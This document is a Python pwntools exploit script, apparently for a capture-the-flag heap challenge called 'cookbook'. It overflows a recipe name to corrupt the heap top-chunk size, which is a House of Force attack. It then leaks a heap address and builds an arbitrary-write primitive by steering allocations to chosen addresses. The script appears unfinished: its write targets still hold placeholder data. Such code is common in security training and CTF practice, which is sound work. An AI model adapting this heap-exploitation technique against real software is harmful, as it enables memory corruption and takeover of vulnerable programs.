import pwn
import ctypes

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'i386'

# r = pwn.process('./cookbook', env={'LD_PRELOAD': './libc-2.27.so'})
r = pwn.process('./cookbook')

free_current_ingredient = 0x08048e06
new_ingredient_malloc = 0x08048dbb
cookbook_malloc = 0x08048bbc

pwn.gdb.attach(r, f"""
    b *{cookbook_malloc}
    c
""")

input("wait")

END_OF_MENU = "[q]uit\n"
END_OF_INGREDIENT_MENU = "[e]xport saving changes (doesn't quit)?\n"

def start():
    r.recvuntil("what's your name?\n")
    r.sendline("hackerman")
    r.recvuntil(END_OF_MENU)

def create_recipe():
    r.sendline("c")
    r.recvuntil(END_OF_MENU)
    r.sendline("n")
    r.recvuntil(END_OF_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_recipe(name):
    r.sendline("c")
    r.recvuntil(END_OF_MENU)
    r.sendline("g")
    r.sendline(name)
    r.recvuntil(END_OF_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def create_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("n")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_ingredient(name):
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("g")
    r.sendline(name)
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def save_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("e")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def exterminate_ingredient(name):
    r.sendline("e")
    r.recvuntil("which ingredient to exterminate? ")
    r.sendline(name)
    r.recvuntil(END_OF_MENU)

def list_ingredient_stats():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("l")
    r.recvuntil("calories: ")
    leak = int(r.recvuntil("\n")[:-1])
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)
    return leak

def delete_current_new_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("d")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_cookbook(name_size, name):
    r.sendline("g")
    r.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) : ")
    r.sendline(hex(name_size))
    r.sendline(name)
    r.recvuntil(END_OF_MENU)

RECIPE_INSTRUCTIONS_BUF_SIZE = 0x330
OFFSET_FROM_INSTRUCTIONS_TO_TOP_CHUNK_SIZE = 0x50

new_top_chunk_size = 0xffffffff

start()
create_recipe()
name_recipe(b"A" * RECIPE_INSTRUCTIONS_BUF_SIZE + b"B" * OFFSET_FROM_INSTRUCTIONS_TO_TOP_CHUNK_SIZE + pwn.p32(new_top_chunk_size))

# create_ingredient()
# name_ingredient("a")
# save_ingredient()

# create_ingredient()
# name_ingredient("b")
# save_ingredient()

loaded_ingredients = ["water", "tomato", "basil", "garlic", "onion", "lemon", "corn", "olive oil"]

for ingredient in loaded_ingredients:
    exterminate_ingredient(ingredient)

heap_leak_once = 0x8b9a4d0
top_chunk_addr_once = 0x8b9b8e8

top_chunk_offset_from_leak = top_chunk_addr_once - heap_leak_once

create_ingredient()
heap_leak = list_ingredient_stats()
curr_top_chunk_addr = heap_leak + top_chunk_offset_from_leak

print("heap leak:")
print(hex(heap_leak))
print("top_chunk_addr:")
print(hex(curr_top_chunk_addr))

def pseudo_arbitrary_write(next_address, data):
    global curr_top_chunk_addr
    CHUNK_OFFSET = 8
    alloc_size = ctypes.c_uint(next_address - curr_top_chunk_addr - CHUNK_OFFSET).value
    fgets_n = ctypes.c_int(alloc_size).value
    if fgets_n < 0:
        print("Moving top_chunk, but not writing anything as fgets size is negative")
        print(f"Allocated address should be {hex(curr_top_chunk_addr + CHUNK_OFFSET)}")
    else:
        print(f"Allocating {alloc_size} bytes")
        print(f"writing {pwn.binascii.hexlify(data)} to {hex(curr_top_chunk_addr + CHUNK_OFFSET)}")
    name_cookbook(alloc_size, data)
    curr_top_chunk_addr = ctypes.c_uint(curr_top_chunk_addr + alloc_size).value

# we need to move in big sizes to avoid the previous freed chunks
MIN_ALLOC_SIZE = 0x500

pseudo_arbitrary_write(0x0804d1a4, b"ABCD")
pseudo_arbitrary_write(0x0804d1a4 + MIN_ALLOC_SIZE, b"XXXX")

r.interactive()

# exterminate_ingredient("b")

# T_CACHE_LIMIT = 7

# for i in range(T_CACHE_LIMIT):
#     create_ingredient()
#     name_ingredient(str(i))
#     save_ingredient()



# delete_current_new_ingredient()
